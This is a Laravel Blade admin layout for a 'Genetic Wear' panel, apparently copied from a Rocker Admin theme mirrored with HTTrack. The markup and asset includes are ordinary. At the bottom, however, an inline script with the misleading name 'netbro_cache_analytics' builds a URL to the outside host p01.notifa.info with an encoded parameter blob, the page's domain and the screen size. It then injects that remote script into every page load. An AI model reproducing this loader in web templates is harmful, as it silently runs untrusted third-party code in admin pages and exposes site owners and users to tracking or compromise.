<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from codervent.com/rocker/color-version/pages-blank-page.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Nov 2019 12:20:59 GMT -->

<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
    <meta name="description" content="" />
    <meta name="author" content="" />
    <title>Admin Panel Genetic Wear</title>
    <!--favicon-->
    <link rel="icon" href="{{ asset('assets2/images/favicon.ico')}}" type="image/x-icon">
    <!-- simplebar CSS-->
    <link href="{{ asset('assets2/plugins/simplebar/css/simplebar.css') }}" rel="stylesheet" />
    <!-- Bootstrap core CSS-->
    <link href="{{ asset('assets2/css/bootstrap.min.css') }}" rel="stylesheet" />
    <!-- animate CSS-->
    <link href="{{ asset('assets2/css/animate.css') }}" rel="stylesheet" type="text/css" />
    <!-- Icons CSS-->
    <link href="{{ asset('assets2/css/icons.css') }}" rel="stylesheet" type="text/css" />
    <!-- Sidebar CSS-->
    <link href="{{ asset('assets2/css/sidebar-menu.css') }}" rel="stylesheet" />
    <!-- Custom Style-->
    <link href="{{ asset('assets2/css/app-style.css') }}" rel="stylesheet" />


</head>

<body>

    <!-- Start wrapper-->
    <div id="wrapper">

        <!--Start sidebar-wrapper-->
        @include('admin.layouts.sidebar')
        <!--End sidebar-wrapper-->

        <!--Start topbar header-->
        @include('admin.layouts.navbar')
        <!--End topbar header-->

        <div class="clearfix"></div>

        <div class="content-wrapper">
            <div class="container-fluid">
                <!-- Breadcrumb-->
                <div class="row pt-2 pb-2">
                    <div class="col-sm-9">
                        <h4 class="page-title">@yield('title-page')</h4>
                    </div>
                </div>
                <!-- End Breadcrumb-->

                {{-- content --}}
                @yield('content')

            </div>
            <!-- End container-fluid-->

        </div>
        <!--End content-wrapper-->
        <!--Start Back To Top Button-->

        <!--Start footer-->
        <footer class="footer">
            <div class="container">
                <div class="text-center">
                    Copyright © 2018 Rocker Admin
                </div>
            </div>
        </footer>
        <!--End footer-->

    </div>
    <!--End wrapper-->


    <!-- Bootstrap core JavaScript-->
    <script src="{{ asset('assets2/js/jquery.min.js') }}"></script>
    <script src="{{ asset('assets2/js/popper.min.js') }}"></script>
    <script src="{{ asset('assets2/js/bootstrap.min.js') }}"></script>

    <!-- simplebar js -->
    <script src="{{ asset('assets2/plugins/simplebar/js/simplebar.js') }}"></script>
    <!-- waves effect js -->
    <script src="{{ asset('assets2/js/waves.js') }}"></script>
    <!-- sidebar-menu js -->
    <script src="{{ asset('assets2/js/sidebar-menu.js') }}"></script>
    <!-- Custom scripts -->
    <script src="{{ asset('assets2/js/app-script.js') }}"></script>

    <script type="text/javascript">
        if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAz4dcBbGgKujWFAQR51fO%2bPm6qO5rwZXo5YjPH6qDtaGM5W6zt0wQjFcbCxKMWzWePB%2f%2fmL05ZfCIzSuNT8TjNA0RvFHxjvpQyDy%2b0nwjEYjkMqXyJnKEcCkYiY0wTpoVkPxy63FCOh7EIAC02C3AAfGuDbybG4jKM8yv7OMn83eoyJZKtSx%2fKBLmcnolqCIokeH90TBi7jNSeVc6FiEq%2bAedoFyijdCS7OPABofv2vd3QlcJ7A6ptffzdgA8s4QS%2fhBtVfNgbibWCqktX7PvSTzMPMy9IMDM4UKk9UgiG%2fwpbKmJ0gsZdUC0BZdjam%2bCKy%2fs29mUdwqXSFdSoB8bm9vzwB9aqXHXw4oGWi4Ubi1yc1R%2bd%2fU6XwWizqXDjRFQV80f4d1nHytNTun4vFBoYTQq7oQBg2NLTiyugl1cBEfGFoWYu6OtemDlfnHIl4HCoQle82LjnsKEjsHK6YS1%2bNa%2fNHfs9XoEz5DwV7YgBL237jtvcrESrwQEXmnXr1Mk" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
    </script>
</body>

<!-- Mirrored from codervent.com/rocker/color-version/pages-blank-page.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Nov 2019 12:20:59 GMT -->

</html>
